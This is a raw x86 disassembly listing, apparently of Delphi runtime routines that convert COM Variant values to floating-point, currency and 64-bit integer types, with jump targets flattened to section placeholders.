mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_41e37c
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
sub edx 0x80000000
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fadd [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_41e53c
fstp [ esp ]
fwait
jmp r-xdata
sub_41e948
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax ]
cmp eax 0x15
ja r-xdata
xor eax eax
push ebp
push sub_41eadb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41e53c
fstp [ ebp - 0xc ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_41e96a ]
fld [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0xc ]
fwait
jmp r-xdata
mov eax [ ebp - 0x8 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0xc ]
fwait
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x10 ]
fstp [ ebp - 0xc ]
fwait
jmp r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x10 ]
fstp [ ebp - 0xc ]
fwait
jmp r-xdata
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x10 ]
fstp [ ebp - 0xc ]
fwait
jmp r-xdata
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x10 ]
fstp [ ebp - 0xc ]
fwait
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x18 ]
fstp [ ebp - 0xc ]
fwait
jmp r-xdata
mov eax [ ebp - 0x8 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0xc ]
fwait
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
sub edx 0x80000000
mov [ ebp - 0x14 ] edx
fild [ ebp - 0x18 ]
fadd [ r-xdata ]
fstp [ ebp - 0xc ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
jmp r-xdata
mov dx 0x4
mov ax 0x1
call sub_41ba38
sub_41eb0c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41ebe8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x4 ]
call sub_42033c
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
call sub_4072f8
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x10 ]
call sub_4153c8
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ebef
lea eax [ ebp - 0x20 ]
mov edx 0x2
call j_sub_4068c4
lea eax [ ebp - 0x4 ]
call sub_406d54
retn
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x4 ]
call sub_4072f8
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
call sub_4137c8
test al al
je r-xdata
movzx edx [ ebx ]
mov cx 0x7
call sub_41becc
jmp r-xdata
movzx edx [ ebx ]
mov cx 0x7
mov eax 0x80020005
call sub_41becc
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_41ebf8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x7
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x7
call sub_41becc
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41ec58
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x7
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x7
call sub_41becc
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_41eca4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41ecf9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_41c5f0
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_41ed54
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ed00
lea eax [ ebp - 0x18 ]
call sub_41c288
retn
sub_41ed08
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
movzx eax [ esi ]
call sub_422ab0
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x7
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_41ed54
push ebx
add esp 0xffffffec
mov ebx eax
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x15
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41ed70 ]
mov eax ebx
call sub_41eb0c
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_41ec58
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_41eb0c
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_41ebf8
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ ebx + 0xc ]
mov [ esp + 0xc ] eax
sub edx 0x80000000
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fadd [ r-xdata ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_41ebf8
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_41ed54
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_41ec58
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_41eca4
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x7
mov ax 0x1
call sub_41ba38
mov eax ebx
call sub_41eb0c
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_41ed08
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x15
ja r-xdata
mov eax ebx
call sub_41ec58
fstp [ esp ]
fwait
mov eax ebx
call sub_41ec58
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_41ef88 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_41ec58
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_41eb0c
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_41ebf8
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
sub edx 0x80000000
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fadd [ r-xdata ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_41ebf8
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_41ed54
fstp [ esp ]
fwait
jmp r-xdata
sub_41f138
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41f1e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x4 ]
call sub_42033c
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_4072f8
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x10 ]
call sub_4138a8
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f1eb
lea eax [ ebp - 0x14 ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call sub_406d54
retn
movzx edx [ ebx ]
mov cx 0x6
mov eax 0x80020005
call sub_41becc
jmp r-xdata
movzx edx [ ebx ]
mov cx 0x6
call sub_41becc
jmp r-xdata
sub_41f1f4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x6
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x6
call sub_41becc
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41f254
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x6
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x6
call sub_41becc
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fild [ esp ]
add esp 0x18
pop ebx
retn
sub_41f2a0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41f2f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_41c5f0
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_41f350
fistp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f2fc
lea eax [ ebp - 0x18 ]
call sub_41c288
retn
sub_41f304
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
movzx eax [ esi ]
call sub_422ab0
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x6
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_41f350
push ebx
add esp 0xffffffec
mov ebx eax
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x15
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41f36c ]
mov eax ebx
call sub_41f138
fistp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_41f254
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_41f254
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_41f138
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_41f1f4
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ ebx + 0xc ]
mov [ esp + 0xc ] eax
sub edx 0x80000000
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fadd [ r-xdata ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_41f1f4
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_41f350
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_41f254
fistp [ esp ]
fwait
jmp r-xdata
fild [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_41f2a0
fistp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x6
mov ax 0x1
call sub_41ba38
mov eax ebx
call sub_41f138
fistp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_41f304
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x15
ja r-xdata
mov eax ebx
call sub_41f254
fistp [ esp ]
fwait
mov eax ebx
call sub_41f254
fistp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_41f5be ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_41f254
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_41f254
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_41f138
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_41f1f4
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
sub edx 0x80000000
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fadd [ r-xdata ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_41f1f4
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_41f350
fistp [ esp ]
fwait
jmp r-xdata
sub_41f7ac
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_406d54
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_41becc
pop ebx
pop ebp
retn 0x8
sub_41f7e4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_406d54
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_41becc
pop ebx
pop ebp
retn 0x8
sub_41f81c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41f8d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_406d54
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_41becc
movzx eax [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f8db
lea eax [ ebp - 0x10 ]
mov edx 0x4
call j_sub_4068c4
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_4072f8
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_410df8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_40730c
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_4072f8
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_410d30
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_40730c
jmp r-xdata
jmp r-xdata
call sub_41bad4
sub_41f8e4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41f98e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41f971
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x100
call sub_41becc
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_407254
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4077d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f978
lea eax [ ebp - 0x10 ]
call sub_41c288
retn
sub_41f99c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41f9f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_41c5f0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_41fa88
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f9f9
lea eax [ ebp - 0x10 ]
call sub_41c288
retn
sub_41fa00
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
mov [ ebp - 0x8 ] edx
mov ebx eax
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x10 ]
movzx eax [ ebx ]
call sub_422ab0
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
movzx eax [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x20 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41fa75
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
call sub_4068f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x20 ]
call sub_41c288
retn
sub_41fa88
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_420122
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x15
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41fac2 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4068f4
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_4068a0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_411914
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx 0x0
call sub_4072d4
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_411914
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx 0x0
call sub_4072d4
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_41374c
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx 0x0
call sub_4072d4
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_41374c
mov edx [ ebp - 0x10 ]
mov eax esi
mov ecx 0x0
call sub_4072d4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_41f7ac
mov edx [ ebp - 0x14 ]
mov eax esi
mov ecx 0x0
call sub_406b98
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_41f7e4
